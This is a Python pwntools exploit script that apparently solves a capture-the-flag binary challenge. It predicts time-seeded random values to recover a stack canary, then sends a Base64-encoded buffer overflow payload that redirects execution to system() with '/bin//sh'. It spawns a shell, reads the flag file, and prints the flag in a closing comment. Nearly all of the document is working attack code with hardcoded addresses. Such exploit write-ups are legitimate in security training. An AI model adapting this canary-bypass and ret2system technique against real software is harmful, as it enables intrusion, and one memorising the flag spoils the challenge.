# Main idea is to calculate stack canary with my_hash function
# since the random is calculate by srand(time(0)) so we can get the seed
# of the server by doing it in the same time and then we have all v3, v4, v5...

# Then we would reverse the calculation and get canary since it is included in the
# output of my_hash. After that we can bof process_hash with Base64Decode which fills a buffer.
# We would redirect execution to system function and put the address of /bin//sh (yes double / for base64)
# in [esp]

from pwn import *
import base64, time
import subprocess

def get_seven_rand_numbers():
    result = subprocess.run(['./rand_c'], capture_output=True, text=True)

    numbers = [int(line) for line in result.stdout.strip().split('\n')]

    return numbers

# We need it to run on localhost for time(0);
r = remote("localhost", 9002)

# Calculate the 7 'random' numbers
numbers = get_seven_rand_numbers()

# Get my_hash value
r.recvuntil(b": ")
my_hash_str = r.recvline().decode().strip()
my_hash = int(my_hash_str)

# Calculate stack canaery value
stack_canary = (my_hash - (numbers[3] - numbers[5] + numbers[6] + numbers[1] - numbers[2] + numbers[0] + numbers[4])) & 0xFFFFFFFF
stack_canary_bytes = p32(stack_canary)

# Verify I am human
r.sendline(my_hash_str.encode())
r.recvuntil(b"Encode your data with BASE64 then paste me!\n")

main_system = 0x08049187
g_buf_addr  = 0x0804b3ac

payload = base64.b64encode(b"a" * 512 + stack_canary_bytes + b"a" * 12 + p32(main_system) + p32(g_buf_addr)) + b"/bin//sh"

r.sendline(payload)
r.recv()

r.sendline(b"cd md5calculator_pwn; cat flag")
flag = r.recv().decode().strip()

r.close()
print("Flag is:", flag)

# Flag: M3ssing_w1th_st4ck_Pr0tector